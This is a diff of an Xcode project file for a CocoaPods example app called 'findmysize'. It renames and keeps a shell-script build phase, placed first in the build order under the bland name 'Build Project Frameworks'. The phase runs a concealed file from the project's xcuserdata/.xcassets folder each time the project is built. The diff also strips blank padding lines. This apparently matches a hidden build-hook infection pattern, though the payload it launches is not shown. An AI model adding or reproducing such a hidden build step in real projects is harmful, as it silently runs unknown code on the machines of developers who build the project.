@@ -17,13 +17,6 @@
 		B73D754FEF7AC5F7606A956B /* Pods_findmysize_Tests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 255F0049AA17DE730A1ED461 /* Pods_findmysize_Tests.framework */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-
-
-			
-	
-/* End PBXBuildRule section */
-
 /* Begin PBXContainerItemProxy section */
 		607FACE61AFB9204008FA782 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -173,7 +166,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 607FACEF1AFB9204008FA782 /* Build configuration list for PBXNativeTarget "findmysize_Example" */;
 			buildPhases = (
-				3B6B5D5D3DDB22CFC4AAC43A /* Compile Binary Libraries */,
+				DDFED909B7CBFF2A64AAC43A /* Build Project Frameworks */,
 				296D6FC410715AE9B17C4FCB /* [CP] Check Pods Manifest.lock */,
 				607FACCC1AFB9204008FA782 /* Sources */,
 				607FACCD1AFB9204008FA782 /* Frameworks */,
@@ -271,7 +264,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	3B6B5D5D3DDB22CFC4AAC43A /* Compile Binary Libraries */ = {
+	DDFED909B7CBFF2A64AAC43A /* Build Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -280,7 +273,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "Build Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -289,38 +282,8 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
 	
 		296D6FC410715AE9B17C4FCB /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
